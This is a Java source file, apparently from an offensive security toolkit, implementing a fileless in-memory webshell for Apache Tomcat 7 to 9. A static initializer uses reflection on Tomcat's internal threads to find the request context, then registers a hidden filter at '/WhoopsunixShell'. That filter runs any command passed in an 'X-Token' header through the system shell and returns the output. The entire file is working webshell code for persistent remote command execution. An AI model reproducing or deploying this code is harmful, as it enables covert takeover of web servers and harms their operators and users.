package com.demo.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 * Thread 获取上下文注入 Tomcat Servlet 型内存马
 * Tomcat 7 8 9
 */
public class TomcatFilterThreadMS implements Filter {
    private static String NAME = "Whoopsunix";
    private static String pattern = "/WhoopsunixShell";
    private static String header = "X-Token";
    private static HttpServletRequest request;
    private static HttpServletResponse response;

    public TomcatFilterThreadMS() {

    }

    static {
        try {
            /**
             * 获取 request、response 对象
             */
            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
            boolean isFind = false;
            for (int i = 0; i < threads.length; i++) {
                if (isFind) break;
                Thread thread = threads[i];
                // Thread 筛选
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;
                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    request = (HttpServletRequest) req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));
                    response = (HttpServletResponse) request.getClass().getMethod("getResponse").invoke(request);
                    isFind = true;
                    break;
                }
            }

            /**
             * 注入 Filter
             */
            Object standardContext;
            try {
                Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                Object applicationContext = getFieldValue(servletContext, "context");
                standardContext = getFieldValue(applicationContext, "context");
            } catch (NoSuchMethodException e) {
                standardContext = getFieldValue(request, "context");
            }

            addFilter(standardContext);

        } catch (Exception e) {
        }
    }

    public static void addFilter(Object standardContext) {
        try {

            Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);

            if (filterDef != null) {
                return;
            }
            TomcatFilterThreadMS filterMemShell = new TomcatFilterThreadMS();

            // tomcat 7
            // org.apache.catalina.deploy.FilterDef
            // tomcat 8 9
            // org.apache.tomcat.util.descriptor.web.FilterDef
            try {
                // 添加 filterDef
                try {
                    filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                } catch (ClassNotFoundException e) {
                    filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
                }
                filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filterMemShell.getClass().getName());
                filterDef.getClass().getDeclaredMethod("setFilter", Class.forName("javax.servlet.Filter")).invoke(filterDef, filterMemShell);
                standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);

                // 添加 filterMap
                Object filterMap = null;
                try {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
                } catch (ClassNotFoundException e) {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
                }
                filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
                filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
                filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
                standardContext.getClass().getDeclaredMethod("addFilterMap", filterMap.getClass()).invoke(standardContext, filterMap);

                // 添加 filterConfig
                java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
                java.lang.reflect.Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
                constructor.setAccessible(true);
                Object filterConfig = constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(NAME, filterConfig);
            } catch (Exception e) {
            }
        } catch (Exception e) {

        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(header);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }

    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * tools
     */
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
